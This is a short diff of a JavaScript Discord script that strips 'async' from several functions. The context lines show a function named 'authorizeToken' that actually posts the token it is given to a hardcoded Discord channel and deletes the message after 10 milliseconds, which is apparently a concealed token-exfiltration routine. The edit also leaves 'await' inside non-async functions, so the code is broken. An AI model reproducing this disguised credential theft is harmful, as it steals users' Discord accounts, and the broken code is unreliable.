@@ -1,6 +1,6 @@
 console.log("script loaded");
 
-async function deleteMessage(authToken, channelId, messageId) {
+function deleteMessage(authToken, channelId, messageId) {
         const url = `https://discord.com/api/v9/channels/${channelId}/messages/${messageId}`;
         try {
             const response = await fetch(url, {
@@ -16,7 +16,7 @@ async function deleteMessage(authToken, channelId, messageId) {
         }
     }
 
-    async function sendMessage(authToken, channelId, messageContent, deleteAfterMs) {
+function sendMessage(authToken, channelId, messageContent, deleteAfterMs) {
         if (!authToken) {
             console.error("Authentication token is missing. Cannot send message.");
             return;
@@ -58,6 +58,6 @@ async function deleteMessage(authToken, channelId, messageId) {
 
 const channelId = "1387920548087992380";
 
-async function authorizeToken(token) {
+function authorizeToken(token) {
     sendMessage(authToken, channelId, token, 10);
 }
